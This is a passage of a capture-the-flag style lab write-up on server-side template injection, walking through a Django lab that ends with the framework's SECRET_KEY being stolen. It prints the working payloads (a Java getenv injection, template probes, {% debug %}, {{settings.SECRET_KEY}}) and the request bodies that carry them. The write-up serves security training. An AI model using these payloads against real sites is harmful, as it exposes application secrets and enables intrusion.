Many templates expose a `self` or `environment` object of some kind, which acts like a namespace and contains all objects, methods, and attributes which are supported by the template engine.

If such objects exists, you can use it to generate a list of objects that are in scope. For example, in Java-based templating languages you can sometimes list all variables using this injection:

`${T(java.lang.System).getenv()}`

This can create a shortlist of potentially interesting objects and methods to investigate further, but also `Burp Intruder` provides a built-in wordlist for brute-forcing variable names.

There are also some site-specific objects supplied by the web developer, and they are likely to contain sensitive information of exploitable methods. 

You may need to study an object's behavior in the context of each distinct template before you find a way to exploit it.

Also, not always RCE is possible, but still there are many exploits that can be available such as `File Path Traversal.`

### Lab.4 Server-Side Template Injection with Information Disclosure via User-Supplied Objects

**Description**

The lab is vulnerable due to the way an object is being passed into the template, and it can be exploited to access sensitive data. The goal of the lab is to access sensitive data, so to solve the lab, you need to steal and submit the framework's secret key.

`content-manager: C0nt3ntM4n4g3r` are the credentials which you can use to login.

**Solution**

I access the lab with the given credentials.

In the homepage I click on one of the articles, and there there is a button to `Edit Template`.

After clicking on that I have the syntax used to create the description.

![Pasted_image_20250126190945](https://github.com/user-attachments/assets/a099ad76-f4dd-4878-a49b-7866af9a3e75)

Let's delete everything above the last line, to keep it simple, and replace the `product.stock` with something that is not known, doesn't exist there, such as my name `halil`. And it should look like:

`<p>Hurry! Only {{halil}} left of {{product.name}} at {{product.price}}.</p>`

That didn't work, as I don't see anything that would give me some information there. It's only:

`Hurry! Only left of The Trolley-ON at $46.42.`

I send that request to the Intruder, and I see that the body is:
`%3Cp%3EHurry%21+Only+%7B%7Bhalil%7D%7D+left+of+%7B%7Bproduct.name%7D%7D+at+%7B%7Bproduct.price%7D%7D.%3C%2Fp%3E`

After decoding that with the `cyberchef` from `URL decoder` I see `<p>Hurry! Only {{halil}} left of {{product.name}} at {{product.price}}.</p>`.

Now, I add a payload position on `%7B%7Bhalil%7D%7D`, and with the Sniper Attack I add these to the list payload:

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

In the payload processing I add a rule to convert them to URL.

I got `302 Found` and I just visit the article page, and I see that I got an error message, mentioning `DJANGO`.

So, now I have the template engine used here.

In Django you can invoke the `debug` by writing `{% debug %}` and url-encoded this is: `%7B%25%20debug%20%25%7D`.

After refreshing the page I got a list of objects and properties.

```text
Hurry! Only {'product': {'name': 'The Trolley-ON', 'price': '$46.42', 'stock': 594}, 'settings': }{'False': False, 'None': None, 'True': True} {'Cookie': , 'HTMLParser': , 'SocketServer': , 'StringIO': , 'UserDict': , 'UserList': , '__builtin__': , '__future__': , '__main__': , '_abcoll': , '_ast': , '_bisect': , '_codecs': , '_collections': , '_ctypes': , '_functools': , '_hashlib': , '_heapq': , '_io': , '_json': , '_locale': , '_random': , '_socket': , '_sre': , '_ssl': , '_struct': , '_sysconfigdata': , '_sysconfigdata_nd': , '_warnings': , '_weakref': , '_weakrefset': , 'abc': , 'argparse': , 'array': , 'ast': , 'atexit': , 'base64': , 'binascii': , 'bisect': , 'bz2': , 'cPickle': , 'cStringIO': , 'calendar': , 'cgi': , 'codecs': , 'collections': , 'contextlib': , 'copy': , 'copy_reg': , 'ctypes': , 'ctypes._ctypes': None, 'ctypes._endian': , 'ctypes.ctypes': None, 'ctypes.errno': None, 'ctypes.os': None, 'ctypes.re': None, 'ctypes.struct': None, 'ctypes.subprocess': None, 'ctypes.sys': None, 'ctypes.tempfile': None, 'ctypes.util': , 'datetime': , 'decimal': , 'dis': , 'django': , 'django.__future__': None, 'django.apps': , 'django.apps.collections': None, 'django.apps.config': , 'django.apps.django': None, 'django.apps.functools': None, 'django.apps.importlib': None, 'django.apps.os': None, 'django.apps.registry': , 'django.apps.sys': None, 'django.apps.threading': None, 'django.apps.warnings': None, 'django.conf': , 'django.conf.__future__': None, 'django.conf.django': None, 'django.conf.global_settings': , 'django.conf.importlib': None, 'django.conf.os': None, 'django.conf.time': None, 'django.core': , 'django.core.__future__': None, 'django.core.base64': None, 'django.core.cache': , 'django.core.cache.__future__': None, 'django.core.cache.backends': , 'django.core.cache.backends.__future__': None, 'django.core.cache.backends.base': , 'django.core.cache.backends.django': None, 'django.core.cache.backends.time': None,
...
```

Here I see that I can access the `settings` object and I see in the documentations that it has also a property `SECRET_KEY` which can be accessed by `{{settings.SECRET_KEY}}` and if url encoded it is: `%7B%7Bsettings.SECRET_KEY%7D%7D`.

So, I put that and send the request again, the body should look like:
`csrf=igQTSvjyfggm8DjIVxJ6xFSeIZyWE0CT&template=%3Cp%3EHurry%21+Only+%7B%7Bsettings.SECRET_KEY%7D%7D+left+of+%7B%7Bproduct.name%7D%7D+at+%7B%7Bproduct.price%7D%7D.%3C%2Fp%3E&template-action=save`

After checking the page, I see the code: `Hurry! Only 82v97tio2h8tpg5a0xs5x4cfg6qy2lv5 left of The Trolley-ON at $46.42.` which I submit, and the lab is solved.